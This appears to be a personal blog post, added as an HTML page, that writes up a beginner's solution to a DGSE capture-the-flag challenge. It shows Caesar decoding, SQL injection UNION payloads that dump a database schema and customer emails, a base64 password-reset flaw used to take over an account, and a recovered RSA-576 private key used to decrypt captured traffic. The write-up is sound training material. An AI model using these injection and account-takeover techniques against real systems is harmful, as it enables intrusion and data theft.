@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.3c9fa6b3264a9f8be4f27730f1d5f0ded496304d03812ed49d97703ffb28122a.css" integrity="sha256-PJ&#43;msyZKn4vk8ncw8dXw3tSWME0DgS7UnZdwP/soEio=" crossorigin="anonymous" media="screen">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<title>
+    Write-up of the DGSE&rsquo;s challenge : Brigitte Friang - Nicolas Bourras
+</title>
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Write-up of the DGSE&#39;s challenge : Brigitte Friang"/>
+<meta name="twitter:description" content="Introduction This was my first CTF. After beginning to learn security in september, I&rsquo;m really proud of what I managed to achieve : finishing 57/753, completing half of the challenges.
+I did learn that cryptography really is one of my weak points.
+TODO : sommaire
+The beginning Opening the website, I was greeted with this page. In the source code, there was :
+&lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;!--/static/message-secret.html--&gt; &lt;/head&gt; Heading to that page reveals a coded message."/>
+
+<meta property="og:title" content="Write-up of the DGSE&#39;s challenge : Brigitte Friang" />
+<meta property="og:description" content="Introduction This was my first CTF. After beginning to learn security in september, I&rsquo;m really proud of what I managed to achieve : finishing 57/753, completing half of the challenges.
+I did learn that cryptography really is one of my weak points.
+TODO : sommaire
+The beginning Opening the website, I was greeted with this page. In the source code, there was :
+&lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;!--/static/message-secret.html--&gt; &lt;/head&gt; Heading to that page reveals a coded message." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nicolasb.fr/blog/writeup-challenge-dgse-brigitte-friang/" />
+<meta property="article:published_time" content="2020-06-09T20:34:00+02:00" />
+<meta property="article:modified_time" content="2020-06-09T20:34:00+02:00" />
+
+
+    
+
+    
+    
+    
+    <title>
+        
+        Write-up of the DGSE&rsquo;s challenge : Brigitte Friang
+        
+    </title>
+</head>
+
+<body>
+    
+    
+    <header class="wrap flex-container">
+        <h1>Write-up of the DGSE&rsquo;s challenge : Brigitte Friang</h1>
+    </header>
+    
+    <main class="wrap">
+        
+<div class="flex-container">
+    <aside role="complementary">
+        Jun 09, 2020 &#183; 1320 words
+        <div class="tag-container">
+            
+            
+            <span class="tag">
+                <a href="/tags/blog/">
+                    blog
+                </a>
+            </span>
+            
+            
+            
+            <span class="tag">
+                <a href="/tags/security/">
+                    security
+                </a>
+            </span>
+            
+            
+            
+            <span class="tag">
+                <a href="/tags/ctf/">
+                    ctf
+                </a>
+            </span>
+            
+            
+        </div>
+    </aside>
+    <hr />
+    <article role="article">
+        <h2 id="introduction">Introduction</h2>
+<p>This was my first CTF. After beginning to learn security in september, I&rsquo;m really proud
+of what I managed to achieve : finishing 57/753, completing half of the challenges.</p>
+<p>I did learn that cryptography really is one of my weak points.</p>
+<p>TODO : sommaire</p>
+<h2 id="the-beginning">The beginning</h2>
+<p><img src="/assets/brigitte-friang/start.png" alt="Challenge page"></p>
+<p>Opening the website, I was greeted with this page. In the source code, there was :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">				&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/style.css&#34;</span>&gt;
+        <span style="color:#75715e">&lt;!--/static/message-secret.html--&gt;</span>
+    &lt;/<span style="color:#f92672">head</span>&gt;
+</code></pre></div><p>Heading to that page reveals a coded message. We quickly find that the text is encoded using a ceasar cipher, with a shift of 19. A simple script allowed me to decrypt it :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> string
+
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;source.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    contents <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+
+out <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+shift <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>
+
+<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> contents:
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> char<span style="color:#f92672">.</span>isalpha():
+        out <span style="color:#f92672">+=</span> char
+        <span style="color:#66d9ef">continue</span>
+
+    <span style="color:#66d9ef">try</span>:
+        alphabet <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>islower() <span style="color:#66d9ef">else</span> string<span style="color:#f92672">.</span>ascii_uppercase
+        index <span style="color:#f92672">=</span> alphabet<span style="color:#f92672">.</span>index(char)
+        out <span style="color:#f92672">+=</span> alphabet[(index <span style="color:#f92672">+</span> shift) <span style="color:#f92672">%</span> len(alphabet)]
+    <span style="color:#66d9ef">except</span>:
+        out <span style="color:#f92672">+=</span> char
+
+<span style="color:#66d9ef">print</span>(out)
+</code></pre></div><blockquote>
+<p>Si vous parvenez a lire ce message, c&rsquo;est que vous pouvez rejoindre l’operation «Brigitte Friang». Rejoignez-nous rapidement.</p>
+<p>Brigitte Friang est une resistante, journaliste et ecrivaine francaise. Elle est nee le 23/01/1924 a Paris, elle a 19 ans sous l&rsquo;occupation lorsqu&rsquo;elle est recrutee puis formee comme secretaire/chiffreuse par un agent du BCRA, Jean-Francois Clouet des Perruches alias Galilee chef du Bureau des operations aeriennes (BOA) de la Region M (Cote du Nord, Finistere, Indre et Loire, Orne, Sarthe, Loire inferieure, Maine et Loire, Morbihan, Vendee). Brigitte Friang utilise parfois des foulards pour cacher des codes. Completez l’URL avec l’information qui est cachee dans ce message.</p>
+<p>Suite a l’arrestation et la trahison de Pierre Manuel, Brigitte Friang est arretee par la Gestapo. Elle est blessee par balle en tentant de s’enfuir et est conduite a l’Hopital de la Pitie. Des resistants tenteront de la liberer mais sans succes. Elle est torturee et ne donnera pas d&rsquo;informations. N’oubliez pas la barre oblique. Elle est ensuite envoyee dans le camp de Ravensbruck.</p>
+<p>Apres son retour de deportation, elle participe a la creation du Rassemblement du peuple français (RPF). Elle integre la petite equipe, autour d&rsquo;Andre Malraux, qui va preparer le discours fondateur de Strasbourg en 1947 et les elections legislatives de 1951.</p>
+<p>Elle rentre a l&rsquo;ORTF, et devient correspondante de guerre. Elle obtient son brevet de saut en parachute et accompagne des commandos de parachutistes en operation durant la guerre d’Indochine. Elle raconte son experience dans Les Fleurs du ciel (1955). D&rsquo;autres agents sont sur le coup au moment ou je vous parle. Les meilleurs d&rsquo;entre vous se donneront rendez-vous a l&rsquo;European Cyberweek a Rennes pour une remise de prix. Resolvez le plus d&rsquo;epreuves avant la fin de cette mission et tentez de gagner votre place parmi l&rsquo;elite! Par la suite, elle couvre l’expedition de Suez, la guerre des Six Jours et la guerre du Viet Nam. Elle prend position en faveur d&rsquo;une autonomie du journalisme dans le service public ce qui lui vaut d&rsquo;etre licenciee de l&rsquo;ORTF.</p>
+<p>Elle ecrit plusieurs livres et temoigne de l&rsquo;engagement des femmes dans la Resistance.</p>
+</blockquote>
+<p>After inspecting the source code, we find that a few of the letters are in bold : <code>/joha</code>. Decoded, this gives us <code>/chat</code>.</p>
+<h2 id="chatting">Chatting</h2>
+<p>I was presented with a few challenges. The goal was to finish one of them, to access a classical CTF platform.</p>
+<p>I&rsquo;m only going to talk about the challenge offered by Nitel, which is the one I solved.</p>
+<p><img src="/assets/brigitte-friang/nitel.png" alt="Conversation with Nitel"></p>
+<p>Nitel gives us two links, which we are going to visit.</p>
+<h3 id="stockos">Stockos</h3>
+<p>Going to the first URL, we are greeted with a login page. Using <code>admin</code>/<code>admin</code> logs us in, and we are greeted with a dashboard.</p>
+<p>Nitel asked us to find the email of one of the clients. Since nonce of them are displayed on the dashboard, we&rsquo;re going to have to find a vulnerability.</p>
+<p>Two forms are present on the website. After entering a single quote in the first one, we get :</p>
+<blockquote>
+<p>Erreur : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; ORDER BY section ASC' at line 1</p>
+</blockquote>
+<p>Bingo! A simple SQL injection gives us the schema of the database :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#e6db74">&#39; union (select table_name, column_name, 3, 4, 5 FROM information_schema.columns) -- -
+</span></code></pre></div><pre><code>customer 	delivery_address 	3 	4 	5
+customer 	email 	3 	4 	5
+customer 	id 	3 	4 	5
+customer 	name 	3 	4 	5
+customer 	signup_date 	3 	4 	5
+orders 	confidential 	3 	4 	5
+orders 	customer 	3 	4 	5
+orders 	delivery_date 	3 	4 	5
+orders 	id 	3 	4 	5
+orders 	item_name 	3 	4 	5
+orders 	order_date 	3 	4 	5
+orders 	order_status 	3 	4 	5
+orders 	section 	3 	4 	5
+orders 	supplier 	3 	4 	5
+section 	capacity 	3 	4 	5
+section 	confidential 	3 	4 	5
+section 	id 	3 	4 	5
+section 	last_update 	3 	4 	5
+section 	name 	3 	4 	5
+supplier 	address 	3 	4 	5
+supplier 	id 	3 	4 	5
+supplier 	name 	3 	4 	5
+supplier 	website 	3 	4 	5
+</code></pre><p>From there, we can extract all of the emails :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#e6db74">&#39; union (select email, 2, 3, 4, 5 from customer) -- -
+</span></code></pre></div><p>Which are :</p>
+<pre><code>orders@acme.zz 	2 	3 	4 	5
+orders@soylent.zz 	2 	3 	4 	5
+orders@initech.zz 	2 	3 	4 	5
+orders@kozey.zz 	2 	3 	4 	5
+orders@massived.zz 	2 	3 	4 	5
+orders@vehement.zz 	2 	3 	4 	5
+orders@hooli.zz 	2 	3 	4 	5
+orders@bailey.zz 	2 	3 	4 	5
+orders@umbrella.zz 	2 	3 	4 	5
+orders@smartchems.zz 	2 	3 	4 	5
+orders@ecorp.zz 	2 	3 	4 	5
+agent.malice@secret.evil.gov.ev 	2 	3 	4 	5
+hbdlb@scep.eg 	2 	3 	4 	5
+</code></pre><p>One email stands out from the rest : <code>agent.malice@secret.evil.gov.ev</code>.</p>
+<h3 id="evil-air">Evil-Air</h3>
+<p>The second URL appears to be a plane ticket website. Nitel asked us to reserve a specific ticket, but after creating an account and trying to reverse it, we&rsquo;re hit with an error message : <code>Vous ne pouvez pas réserver cette destination</code> or <code>You can't reserve this destination.</code>.</p>
+<p>So, once again, we&rsquo;re going to have to find a vulnerability. After registering a few accounts, I looked at the format of the validation link :</p>
+<pre><code>/35e334a1ef338faf064da9eb5f861d3c/activate/YWx0LmNxLTlvb3Zrb2tlQHlvcG1haWwuY29t
+</code></pre><p>Hmmm. That last part of the URL suspiciously looks like base64&hellip; And it is! Decoding it gives us the email address that I used.</p>
+<p>Now the interesting part is that the password reinitialization link uses the same kind of hash. AND it doesn&rsquo;t actually reset the password, it shows us the stored password.</p>
+<p>Maybe trying to use the email we got just before would work? After sending a password reset request to <code>agent.malice@secret.evil.gov.ev</code>, we can just go to this URL :</p>
+<p><a href="https://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/reset/YWdlbnQubWFsaWNlQHNlY3JldC5ldmlsLmdvdi5ldg==">https://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/reset/YWdlbnQubWFsaWNlQHNlY3JldC5ldmlsLmdvdi5ldg==</a></p>
+<p>And we get the password. After trying to reserve the ticket, we find out that it&rsquo;s already reserved. The ticket is stored in the user account, so we can access it. A QR Code is associated :</p>
+<p><img src="/assets/brigitte-friang/ticket.png" alt="The ticket"></p>
+<p>Decoding it gives us the flag! We can now continue our conversation with Nitel :</p>
+<p><img src="/assets/brigitte-friang/nitel_2.png" alt="Following our conversation with Nitel"></p>
+<h3 id="pcap-analysis">Pcap analysis</h3>
+<p>The given pcap contains https encrypted traffic. We need a way to decrypt it..</p>
+<p>First, let&rsquo;s <a href="https://security.stackexchange.com/questions/123851/how-can-i-extract-the-certificate-from-this-pcap-file">look at the certificate that is used</a>. We can extract it using wireshark, by right clicking the certificate information and using <code>Export Packet Bytes</code> to <code>cert.der</code>.</p>
+<p>Then, we can use <code>openssl x509 -inform der -in cert.der -text</code> to get some information. The intersecting part :</p>
+<pre><code>...
+RSA Public-Key: (576 bit)
+...
+</code></pre><p>Now RSA 576 has been factorized. In fact, you can find the factors <a href="https://en.wikipedia.org/wiki/RSA_numbers#RSA-576">on wikipedia</a>. I followed this <a href="https://helperbyte.com/questions/50507/rsa-576bit-how-to-decrypt">very good tutorial</a>, which gives ut the private key :</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+MIIBXwIBAAJJAMLLsk/b+SO2Emjj8Ro4lt5FdLO6WHMMvWUpOIZOIiPu63BKF8/Q
+jRa0aJGmFHR1mTnG5Jqv5/JZVUjHTB1/uNJM0VyyO0zQowIDAQABAkgyAw5Cxp1O
+d95+I5exPbouUvLFeiBfWXP+1vh2MvU8+IhmCf9j+hFOK13x22JJ+Orwv1+iatW4
+5It/qwUNMvxXS0RuItCLp7ECJQDM6VRX8SfElUbleEECmsavcGBMZOgoEBisu1OC
+M7tX83puaJUCJQDzXLgl8AM5bxHxSaWaD+c9tDFiyzBbjr/tpcqEC+JMU2tqrlcC
+JQCjGt8+GQD0o3YJVc05i4W3RBYC+RcqPJXHeFyieRcYjP/ZPnkCJQDVUULBTl8l
+KuzJWcrk/metuJNJi925g6lMwHSBxoD4cm7HtkUCJFqWTOzCIODw7eoypcJYjm2O
+/ohEsSjEXsg6Bh8mY3LunBaqiA==
+-----END RSA PRIVATE KEY-----
+</code></pre><p>We can know decode the traffic using wireshark, by going to Edit -&gt; Preferences -&gt; Protocols -&gt; SSL -&gt; RSA Keys list, and then by adding the key (as a file).</p>
+<p>Then, when looking at the decoded traffic, we see this hash : <code>7a144cdc500b28e80cf760d60aca2ed3</code>. And it brings us to the next step : the CTF platform!</p>
+<h2 id="the-ctf-platform">The CTF Platform</h2>
+<p>I finished 7 of the 14 challenges, which is (I think) pretty good. My team name was <code>Arctic Coffee</code>.</p>
+
+    </article>
+</div>
+
+
+        
+<nav role="navigation" class="flex-container bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/blog">back</a>
+        
+            &#183;
+        
+    
+
+    
+        
+            <a href="/blog">blog</a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/recipes">recipes</a>
+        
+            &#183; 
+            <a href="/about">who am I?</a>
+        
+    
+    &#183; 
+    <a href="/">
+        home
+    </a>
+
+</p>
+</nav>
+
+    </main>
+    
+    <footer class="flex-container footer">Nicolas Bourras&rsquo;s site</footer>
+    
+    
+</body>
+
+</html>
